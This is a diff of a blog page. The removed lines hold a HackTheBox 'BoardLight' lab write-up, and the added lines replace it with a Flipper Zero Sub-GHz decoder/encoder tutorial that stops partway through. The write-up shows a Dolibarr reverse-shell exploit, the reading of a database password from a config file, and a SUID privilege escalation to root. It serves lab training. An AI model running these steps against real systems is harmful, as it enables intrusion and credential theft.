@@ -13,30 +13,36 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://kazma.tw/2024/08/11/hackthebox-machines-boardlight-writeup/"/>
+    <link rel="canonical" href="https://kazma.tw/2024/09/21/flipper-zero-宇宙最強攻略：30-天帶你從入門到入坑-day07-比馬里亞納海溝還深的-sub-ghz-解析最終章/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="Exploitation一樣先做基本的掃描： 123456789101112└──╼ [★]$ nmap -sV 10.10.11.11Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-08-11 06:53 CDTNmap scan report for 10.10.11.11Host is up (0.24s latency).Not sho">
+        <meta name="description" content="前言嗨嗨，我是 Kazma。今天的目標是帶過 Derek Jamison Rolling Code 系列影片的後半段，但因為他真的教的太仔細了，其實很難在鐵人賽完整的教學這塊，所以今天的目標是介紹裡面一些比較有趣的內容介紹，並且鼓勵大家之後都去看看他做的影片，可以學得很扎實。 資安倫理宣導請注意，透過 Flipper Zero 所學到的技術與知識，主要目的是提升個人技術能力與資訊安全意識。我們強烈">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HackTheBox-Machines BoardLight Writeup">
-<meta property="og:url" content="https://kazma.tw/2024/08/11/HackTheBox-Machines-BoardLight-Writeup/index.html">
+<meta property="og:title" content="Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day07 - 比馬里亞納海溝還深的 Sub-GHz 解析最終章">
+<meta property="og:url" content="https://kazma.tw/2024/09/21/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day07-%E6%AF%94%E9%A6%AC%E9%87%8C%E4%BA%9E%E7%B4%8D%E6%B5%B7%E6%BA%9D%E9%82%84%E6%B7%B1%E7%9A%84-Sub-GHz-%E8%A7%A3%E6%9E%90%E6%9C%80%E7%B5%82%E7%AB%A0/index.html">
 <meta property="og:site_name" content="kazma&#39;s blog">
-<meta property="og:description" content="Exploitation一樣先做基本的掃描： 123456789101112└──╼ [★]$ nmap -sV 10.10.11.11Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-08-11 06:53 CDTNmap scan report for 10.10.11.11Host is up (0.24s latency).Not sho">
+<meta property="og:description" content="前言嗨嗨，我是 Kazma。今天的目標是帶過 Derek Jamison Rolling Code 系列影片的後半段，但因為他真的教的太仔細了，其實很難在鐵人賽完整的教學這塊，所以今天的目標是介紹裡面一些比較有趣的內容介紹，並且鼓勵大家之後都去看看他做的影片，可以學得很扎實。 資安倫理宣導請注意，透過 Flipper Zero 所學到的技術與知識，主要目的是提升個人技術能力與資訊安全意識。我們強烈">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://kazma.tw/images/light_login.png">
-<meta property="og:image" content="https://kazma.tw/images/light_conf.png">
-<meta property="og:image" content="https://kazma.tw/images/light_pwn.png">
-<meta property="article:published_time" content="2024-08-11T03:36:19.705Z">
-<meta property="article:modified_time" content="2024-08-11T12:49:29.653Z">
+<meta property="og:image" content="https://kazma.tw/images/flipper_sound.png">
+<meta property="og:image" content="https://kazma.tw/images/sub_detail.png">
+<meta property="og:image" content="https://kazma.tw/images/decoder.png">
+<meta property="og:image" content="https://kazma.tw/images/encoder.png">
+<meta property="og:image" content="https://kazma.tw/images/flipper_cli.png">
+<meta property="og:image" content="https://kazma.tw/images/flipper_debug.png">
+<meta property="og:image" content="https://kazma.tw/images/graph.png">
+<meta property="og:image" content="https://kazma.tw/images/pie_chart.png">
+<meta property="og:image" content="https://kazma.tw/images/another_data.png">
+<meta property="og:image" content="https://kazma.tw/images/twelve.png">
+<meta property="article:published_time" content="2024-09-21T10:00:29.134Z">
+<meta property="article:modified_time" content="2024-09-21T11:57:42.197Z">
 <meta property="article:author" content="kazma">
-<meta property="article:tag" content="writeup">
-<meta property="article:tag" content="htb">
-<meta property="article:tag" content="machines">
-<meta property="article:tag" content="pt">
+<meta property="article:tag" content="flipper-zero">
+<meta property="article:tag" content="iThome">
+<meta property="article:tag" content="toy">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://kazma.tw/images/light_login.png">
+<meta name="twitter:image" content="https://kazma.tw/images/flipper_sound.png">
     
     
     <!--- Icon Part-->
@@ -48,7 +54,7 @@
     
     <title>
         
-            HackTheBox-Machines BoardLight Writeup -
+            Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day07 - 比馬里亞納海溝還深的 Sub-GHz 解析最終章 -
         
         kazma&#39;s blog
     </title>
@@ -607,7 +613,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">65</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">63</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -633,7 +639,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HackTheBox-Machines BoardLight Writeup</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day07 - 比馬里亞納海溝還深的 Sub-GHz 解析最終章</h1>
                 </div>
             
             </div>
@@ -654,15 +660,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-08-11 11:36:19</span>
-        <span class="mobile">2024-08-11 11:36:19</span>
+        <span class="desktop">2024-09-21 18:29</span>
+        <span class="mobile">2024-09-21 18:29</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-08-11 20:49:29</span>
-            <span class="mobile">2024-08-11 20:49:29</span>
+            <span class="desktop">2024-09-21 19:57:42</span>
+            <span class="mobile">2024-09-21 19:57:42</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -674,19 +680,15 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/writeup/">writeup</a>&nbsp;
+                        <a href="/tags/flipper-zero/">flipper-zero</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/htb/">htb</a>&nbsp;
+                        | <a href="/tags/iThome/">iThome</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/machines/">machines</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/pt/">pt</a>&nbsp;
+                        | <a href="/tags/toy/">toy</a>&nbsp;
                     </li>
                 
             </ul>
@@ -712,53 +714,71 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>一樣先做基本的掃描：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV 10.10.11.11</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 06:53 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.11</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 12.76 seconds</span><br></pre></td></tr></table></figure></div>
-<p>看起來有網頁服務跟 ssh，用 <code>whatweb</code> 可以看網頁資訊：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ whatweb 10.10.11.11</span><br><span class="line">http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]</span><br></pre></td></tr></table></figure></div>
-<p>順便加到 &#x2F;etc&#x2F;hosts</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.11.11 board.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">10.10.11.11 board.htb</span><br></pre></td></tr></table></figure></div>
-<p>接著可以掃 subdomain：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ ffuf -u http://board.htb -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H <span class="string">&quot;Host:FUZZ.board.htb&quot;</span> -fw 6243 </span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://board.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.board.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response words: 6243</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 380ms]</span></span><br></pre></td></tr></table></figure></div>
-<p>可以看到有個 crm 的 subdomain，我們也把他加到 &#x2F;etc&#x2F;hosts</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.11.11 crm.board.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">10.10.11.11 crm.board.htb</span><br></pre></td></tr></table></figure></div>
-<p>用瀏覽器訪問 crm.board.htb 會看到一個登入頁面：<br><img  
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>嗨嗨，我是 Kazma。<br>今天的目標是帶過 Derek Jamison Rolling Code 系列影片的後半段，但因為他真的教的太仔細了，其實很難在鐵人賽完整的教學這塊，所以今天的目標是介紹裡面一些比較有趣的內容介紹，並且鼓勵大家之後都去看看他做的影片，可以學得很扎實。</p>
+<h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 所學到的技術與知識，主要目的是提升個人技術能力與資訊安全意識。我們強烈呼籲各位，不要將這些知識應用於任何違法活動。您有責任確保所學知識的合法用途。針對今天的主題，大家務必要注意以下幾點：</p>
+<ul>
+<li>絕對不要測試不屬於自己的設備，或是未經授權的設備。</li>
+<li>切勿測試您自己日常使用的或生活必需的裝置。</li>
+<li>重放攻擊（Replay Attack）或是訊號模糊測試（Fuzzing Signals）有可能導致接收器與發射設備不同步，並可能造成損壞，後果須自行承擔。</li>
+</ul>
+<h2 id="Security-1-0-2-0-decode"><a href="#Security-1-0-2-0-decode" class="headerlink" title="Security+ 1.0&#x2F;2.0 decode"></a>Security+ 1.0&#x2F;2.0 decode</h2><p>我們昨天的文章主要帶過了 Derek Jamison 影片清單的前四個，而到了第五個的時候，有網友留言問能不能做成大學等級的課程。所以第五個影片 Derek Jamison 嘗試把我們錄製到的 Security+ 1.0 和 Security+ 2.0 原始訊號一步步 decode 給大家看。在影片一開始作者嘗試播放了兩個協議原始訊號的聲音讓我們理解他們的差異：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/light_login.png"
-                      alt="login"
-                ><br>看到 title 是 Dolibarr，上網查一下這是什麼：</p>
-<blockquote>
-<p>Dolibarr ERP CRM is an open source, free software package for companies of any size, foundations or freelancers. It includes different features for enterprise resource planning (ERP) and customer relationship management (CRM) but also other features for different activities.</p>
-</blockquote>
-<p>總之就是一個開源給企業的 ERP + CRM。<br>我們同時搜尋一下他的 default password：</p>
-<blockquote>
-<p>Login&#x2F;password of Dolibarr ERP &amp; CRM: - If you did not change it, login is admin and password is the same than the one sent by email for your dashboard access, once your instance was created. Take a look into your message box to retreive it. EMail topic should start with “Welcome to Dolicloud”.</p>
-</blockquote>
-<p>結果就順利用 default password 滑進去了。<br>那同時也搜尋一下 Dolibarr 17.0.0 有沒有已知漏洞，結果當然是有的：<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253" >https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ python exploit.py -h</span><br><span class="line">usage: python3 exploit.py &lt;TARGET_HOSTNAME&gt; &lt;USERNAME&gt; &lt;PASSWORD&gt; &lt;LHOST&gt; &lt;LPORT&gt;</span><br><span class="line">example: python3 exploit.py http://example.com login password 127.0.0.1 9001</span><br><span class="line"></span><br><span class="line">---[Reverse Shell Exploit <span class="keyword">for</span> Dolibarr &lt;= 17.0.0 (CVE-2023-30253)]---</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  hostname    Target hostname</span><br><span class="line">  username    Username of Dolibarr ERP/CRM</span><br><span class="line">  password    Password of Dolibarr ERP/CRM</span><br><span class="line">  lhost       Listening host <span class="keyword">for</span> reverse shell</span><br><span class="line">  lport       Listening port <span class="keyword">for</span> reverse shell</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>  show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">┌─[sg-vip-2]─[10.10.14.22]─[kazma@htb-jejtlehtvs]─[~/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]</span><br><span class="line">└──╼ [★]$ python3 exploit.py http://crm.board.htb admin admin 10.10.14.22 4444</span><br><span class="line">[*] Trying authentication...</span><br><span class="line">[**] Login: admin</span><br><span class="line">[**] Password: admin</span><br><span class="line">[*] Trying created site...</span><br><span class="line">[*] Trying created page...</span><br><span class="line">[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection</span><br></pre></td></tr></table></figure></div>
-<p>Reverse shell：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.11.11] 44222</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (893): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$</span><br></pre></td></tr></table></figure></div>
-<p>拿到 shell 後我們一樣先換 bash，然後我們上網搜尋一下 Dolibarr 的設定檔放在哪個位置：<br><img  
+                     data-src="/../images/flipper_sound.png"
+                      alt="sound"
+                ><br>圖片來源：<a class="link"   target="_blank" rel="noopener" href="https://youtu.be/CEFb-8htKOA?si=_wHgyISB-a4X7Ss" >https://youtu.be/CEFb-8htKOA?si=_wHgyISB-a4X7Ss <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>_<br>接著他就開始一步步拆解封包內容 decode 給大家看：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/light_conf.png"
-                      alt="conf"
-                ><br>讚讚讚，我們來找找 conf&#x2F;conf.php，裡面應該會有 db_pass：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@boardlight:/$ find /var -name <span class="string">&quot;conf.php&quot;</span> 2&gt;/dev/null</span><br><span class="line">find /var -name <span class="string">&quot;conf.php&quot;</span> 2&gt;/dev/null</span><br><span class="line">/var/www/html/crm.board.htb/htdocs/conf/conf.php</span><br><span class="line">www-data@boardlight:/$ <span class="built_in">cat</span> /var/www/html/crm.board.htb/htdocs/conf/conf.php | grep db_pass</span><br><span class="line">&lt;l/crm.board.htb/htdocs/conf/conf.php | grep db_pass</span><br><span class="line"><span class="variable">$dolibarr_main_db_pass</span>=<span class="string">&#x27;serverfun2$2023!!&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
-<p>拿到 user password 了，我們嘗試切換到 user：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@boardlight:/$ su larissa</span><br><span class="line">su larissa</span><br><span class="line">Password: serverfun2<span class="variable">$2023</span>!!</span><br><span class="line"></span><br><span class="line">larissa@boardlight:/$ <span class="built_in">cd</span> ~   </span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">larissa@boardlight:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Desktop    Downloads  Pictures  Templates  Videos</span><br><span class="line">Documents  Music      Public    user.txt</span><br></pre></td></tr></table></figure></div>
-<p>順利登入！那我們直接用 ssh 登入 larissa 的帳號，同時我們檢查一下 SUID 可以發現 enlightenment 有給 SUID：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ ssh larissa@10.10.11.11</span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.11.11 (10.10.11.11)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.11.11<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">larissa@10.10.11.11&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">larissa@boardlight:~$ find / -perm /u=s 2&gt;/dev/null</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/vmware-user-suid-wrapper</span><br></pre></td></tr></table></figure></div>
-<p>那我們接著可以上網查詢相關的 exploit：<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit" >https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">larissa@boardlight:~$ vi exploit.sh</span><br><span class="line">larissa@boardlight:~$ <span class="built_in">chmod</span> +x exploit.sh </span><br><span class="line">larissa@boardlight:~$ ./exploit.sh </span><br><span class="line">CVE-2022-37706</span><br><span class="line">[*] Trying to find the vulnerable SUID file...</span><br><span class="line">[*] This may take few seconds...</span><br><span class="line">[+] Vulnerable SUID binary found!</span><br><span class="line">[+] Trying to pop a root shell!</span><br><span class="line">[+] Enjoy the root shell :)</span><br><span class="line">mount: /dev/../tmp/: can<span class="string">&#x27;t find in /etc/fstab.</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># find / -name &quot;root.txt&quot;</span></span><br><span class="line"><span class="string">/root/root.txt</span></span><br></pre></td></tr></table></figure></div>
-<p>我們把 exploit 用 vi 寫進去，給上執行權限，執行後就可以順利一鍵提權！</p>
-<h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img  
+                     data-src="/../images/sub_detail.png"
+                      alt="detail"
+                ><br>圖片來源：<a class="link"   target="_blank" rel="noopener" href="https://youtu.be/CEFb-8htKOA?si=_wHgyISB-a4X7Ss" >https://youtu.be/CEFb-8htKOA?si=_wHgyISB-a4X7Ss <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>_<br>因為真的太仔細了，用文章教這個大概會截一百多張圖，但很歡迎各位去看看，真的教的扎實：<a class="link"   target="_blank" rel="noopener" href="https://youtu.be/CEFb-8htKOA?si=hRW667rNi6sh1hSd%E3%80%82" >https://youtu.be/CEFb-8htKOA?si=hRW667rNi6sh1hSd。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="Sub-GHz-Decoder-Encoder"><a href="#Sub-GHz-Decoder-Encoder" class="headerlink" title="Sub-GHz Decoder&#x2F;Encoder"></a>Sub-GHz Decoder&#x2F;Encoder</h2><p>第六部影片在介紹 Sub-GHz 的 decoder 和 encoder 是怎麼運作的。</p>
+<h3 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h3><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/light_pwn.png"
-                      alt="pwn"
-                ></p>
+                     data-src="/../images/decoder.png"
+                      alt="decoder"
+                ><br>圖片來源：<a class="link"   target="_blank" rel="noopener" href="https://youtu.be/O4bEuYwytv0?si=iDzJmKERKojx1zjR" >https://youtu.be/O4bEuYwytv0?si=iDzJmKERKojx1zjR <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>在 decoder 開始運作後，首先就會呼叫 <code>alloc</code> 把資源 allocate 進來並且 load 進需要的設定檔，<code>free</code> 就是結束時會把所有 allocate 的資料釋放。<code>feed</code> 會包含訊號裡面的許多資訊，像是 level 現在是 on&#x2F;off，pulse 的 duration 和 processes，以及 count 跟 data。<code>reset</code> 則是會把 <code>feed</code> 還原成初始狀態。<code>deserialize</code> 會把 flipper 裡面的 .sub file 反序列化出 <code>.data_count_bit</code> 和 <code>.data</code>，像是照片裡面的例子是 12 bit 和 0x00005461。<code>get_hash_data</code> 則是會根據剛剛的 <code>.data_count_bit</code> 還有 <code>.data</code> 取得一個值，同時會去比較他是已經存在歷史紀錄的值還是沒出現過的。<code>serialize</code> 則是把 <code>.data_count_bit</code> 和 <code>.data</code> 轉換成 .sub 檔案儲存。<code>get_string</code> 則是會 return <code>.data_count_bit</code> 還有 <code>.data</code> 到 flipper 螢幕上顯示以及 CLI 介面上。</p>
+<h3 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/encoder.png"
+                      alt="encoder"
